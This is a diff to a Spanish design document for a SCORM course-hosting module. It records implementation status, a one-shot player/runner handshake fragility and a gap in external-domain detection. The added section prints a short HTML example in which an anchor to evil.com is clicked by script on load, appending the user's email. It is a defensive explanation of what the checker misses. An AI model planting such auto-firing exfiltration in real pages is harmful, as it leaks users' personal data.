@@ -6,7 +6,10 @@
 **Módulo:** F — Formación
 **Afecta:** `lib/sig/scorm-modelo.ts`, `lib/sig/scorm-manifiesto.ts`,
 `app/scorm/archivo/[paqueteId]/[...ruta]/route.ts`, y el paquete `gestionar-leads` (fuera del repo)
-**Estado:** Diseñado; pendiente de implementar
+**Estado:** §4.B, §4.C y §4.D implementados y verificados (`verificar:build` en limpio, 2643
+pruebas). §4.A migrado: `gestionar-leads-scorm2004.zip` pasa el analizador como
+`2004 4th Edition · AUTOCONTENIDO · dominiosExternos: []`. **Falta el recorrido de punta a punta
+(§6, Regla 3)**, que necesita navegador y la base local.
 
 ---
 
@@ -580,3 +583,41 @@ ya está: no hay que volver a correr a nadie por el curso.
 **SCORM 1.2.** Fuera de alcance por §3.1, y el rechazo se queda. Si algún día llega un paquete 1.2
 que no se pueda migrar —uno comprado, sin fuentes—, el trabajo está diseñado en la alternativa (a)
 y el porcentaje de avance seguirá sin existir.
+
+**Un ancla que dispara un script no la ve `dominiosDe`, y no se puede ver desde ahí.** Encontrada
+en revisión adversarial mientras se construía §4.D:
+
+```html
+<a id="go" href="https://evil.com/x">ir</a>
+<script>go.href += '?u=' + correo; go.click();</script>
+```
+
+El `href` cumple la regla al pie de la letra —**es** una URL http llana— pero nadie lo clica: el
+script lo dispara solo al cargar y le agrega el correo en el query. La justificación de la
+exención —«una navegación que la persona puede tomar, con su propia sesión»— no se sostiene.
+
+Tres razones para dejarla escrita en vez de perseguirla acá:
+
+1. **No la abrió §4.D.** Existe desde que la exención existe; es inherente a eximir anclas, no a
+   cómo se decide cuál se exime. Antes de §4.D el ancla se contaba, pero por accidente —se contaba
+   *toda* ancla—, no porque alguien hubiera visto este caso.
+2. **Detectarla es la trampa que §4.D acaba de evitar.** Habría que buscar un `.click()` en un
+   script, y mañana un `dispatchEvent`, y pasado un `form.submit()`. Es el mismo whack-a-mole que
+   la regla de los tres tramos sacó de la función.
+3. **Hay una capa que sí la gobierna, y no es una heurística de texto.** Una navegación disparada
+   por el documento cae bajo la CSP y el `sandbox` del marco del SCO, donde la ofuscación no ayuda.
+   Con la salvedad que el propio `scorm-origen.ts` ya documenta: SCORM necesita `allow-same-origin`
+   para que el SCO alcance `API_1484_11` subiendo por `window.parent`, y un marco con
+   `allow-scripts allow-same-origin` puede quitarse el atributo a sí mismo. Cerrarla de verdad es
+   un diseño propio, no un parámetro.
+
+**El saludo entre el player y el runner es de un solo tiro.** `Runner.client.tsx` publica `LISTO`
+exactamente una vez al montar, y no reintenta. Si el player no lo oye —su oyente se instala en un
+efecto—, el runner se queda en «Cargando el curso…» para siempre y lo único que aparece es el aviso
+de 30 s del player, que habla de dominios y CSP y manda a buscar el problema donde no está.
+
+Se analizó el riesgo de modo estricto de React y **ahí no muerde**: el desmontaje y el remontaje
+son síncronos dentro del mismo commit, así que ningún `postMessage` —que es una tarea encolada—
+puede colarse en el hueco. Queda como fragilidad de diseño, no como defecto observado: es el
+**primer sospechoso** si el recorrido de punta a punta se cuelga en «Cargando». El arreglo natural
+es que el runner reintente `LISTO` hasta recibir `ESTADO`.
